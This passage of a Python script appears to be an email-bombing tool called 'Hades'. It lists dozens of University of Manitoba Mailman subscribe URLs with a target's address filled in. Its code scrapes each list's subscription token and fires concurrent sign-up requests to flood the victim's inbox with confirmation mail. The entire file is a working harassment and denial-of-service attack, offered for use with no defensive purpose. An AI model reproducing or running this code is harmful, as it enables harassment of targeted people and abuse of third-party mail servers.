                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sJcAd': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-microbiology-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-microbiology-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lqYdl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-microbiology-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-microbiology-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JbwQH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-microbiology-grad',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-microbiology-grad',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JxLbP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-statistics-invigilators',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-statistics-invigilators',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TegCD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/science-statistics-majorhonours',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/science-statistics-majorhonours',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LTzKt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/second-year-nswp-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/second-year-nswp-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kbdLu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/servicedisruptions',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/servicedisruptions',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fHrgv': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/sig-ccl-stakeholders',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/sig-ccl-stakeholders',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'afOak': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/slam-members',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/slam-members',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aDKLn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/soa-honours',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/soa-honours',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KAaAn': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/soart-faculty-council',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/soart-faculty-council',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DqmRV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YmAEO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-bsw-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-bsw-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gNfMz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-de-sessionals',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-de-sessionals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YCuzQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-indigenous-caucus',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-indigenous-caucus',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Tbmgz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-mswgrads',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-mswgrads',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HmUiH': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-mswstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-mswstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eeOIk': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-nswp',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-nswp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YGTRO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-nswp-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-nswp-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VSchX': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-nswp-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-nswp-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Muihy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-premswstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-premswstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FGZkR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-researchcommittee',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-researchcommittee',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ryOPO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-retiree',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-retiree',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qoBwI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-thompson-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-thompson-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QgLJQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/socialwork-thompson-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/socialwork-thompson-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },


        }

    async def send(self, url: str, key: str, data, token=False) -> None:
        if token:
            data['sub_form_token'] = await self.generate_token(token)

            await asyncio.sleep(5.5)

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data) as response:
                    if key in await response.text():
                        print(f'Success with {url}')

                    else:
                        print(f'Success with {url}')

        except Exception as e:
            print(f'Error - {e}')

    async def generate_token(self, url: str) -> str:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                matches = re.findall(r'(?<=sub_form_token" value=").+?(?=")', str(await response.content.read()))

                if matches:
                    return matches[0]

if __name__ == '__main__':
    try:
        bomber = Bomber(email) # Passing target email to bomber class
        loop = asyncio.get_event_loop()
        loop.run_until_complete(asyncio.gather(
                *[bomber.send(value['url'], value['key'], value['data']) if 'token_url' not in value else bomber.send(value['url'], value['key'], value['data'], token=value['token_url']) for key, value in bomber.parameters.items()]
            )
        )
    except:
        print('your internet connection is to slow to handle Hades please run this on a VPS goodbye')
        pass

